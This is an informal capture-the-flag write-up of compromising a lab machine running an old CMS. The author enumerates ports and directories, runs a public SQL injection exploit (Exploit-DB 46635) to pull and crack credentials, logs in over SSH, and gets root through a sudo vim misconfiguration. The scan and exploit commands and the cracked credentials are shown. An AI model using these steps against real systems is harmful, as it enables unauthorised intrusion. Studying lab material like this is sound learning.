so first i started with enumerating the ports

by using rustscan 


 $rustscan -a 10.10.61.207


Open 10.10.61.207:21
Open 10.10.61.207:80
Open 10.10.61.207:2222

after that i started enumerating the ports and started a gobuster scan on port 80

gobuster -u http://10.10.61.207 -w /wordlist -x php,txt,html -t 100

i found the cms directory /simple 
and from there i found the version of the cms that was in the end cms ver 2.8.8

to get the admin panel i started again gobuster scan on the port 80 in the /simple directory where i found the /admin dir

i started for looking the exploit of cms 2.2.8 on exploit db

and found it

https://www.exploit-db.com/exploits/46635

after that downloads it and made some edits like chaging
#!/usr/bin/env python --> #!/usr/bin/python

and to remove the badinterpreter i did this

sed -i -e 's/\r$//' scriptname.sh


this removed the error after that i executed the script

python2 46635.py  -u http://10.10.168.60/simple -c -w /home/duck/Desktop/payloads/wordlist/best110.txt


this was very buggy idk why 

[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
[+] Password cracked: secret


after this i cracked the password by hashcat

using salt+hash or hash+salt by using module 20 or 10

the password by secret


i tried to hack using the cms but was not able to hack it idk why

then i opened up a walkthrough coz i was frustated (the exploit was very glitchy dammmm ! )


i saw we can login into ssh by using the creds got!

and by sudo -l saw vim was given sudo perms 

just opened gtfobins and searched for sudo vim and got the root!

cheers
